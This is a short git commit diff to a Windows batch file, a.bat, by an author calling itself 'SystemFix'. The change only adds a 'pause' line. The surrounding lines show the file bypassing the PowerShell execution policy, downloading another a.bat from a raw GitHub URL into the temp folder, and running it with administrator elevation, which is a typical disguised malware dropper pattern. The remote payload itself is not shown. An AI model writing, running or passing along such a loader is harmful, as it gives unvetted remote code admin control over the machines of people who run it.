0c74b1aabfe9a958b68d8e63853880e5f2a6ea81
SystemFix <ab7132311@gmail.com>
2025-01-08 01:20:42 +0500

    Update a.bat

--- a.bat
+++ a.bat
@@ -5,3 +5,5 @@ powershell -NoProfile -Command "Set-ExecutionPolicy Bypass -Scope Process -Force
 powershell -NoProfile -Command "iwr 'https://raw.githubusercontent.com/cqdll/-/main/a.bat' -OutFile \"%TEMP%\a.bat\" -UseBasicParsing"
 
 powershell -NoProfile -Command "Start-Process \"%TEMP%\a.bat\" -Verb RunAs"
+
+pause
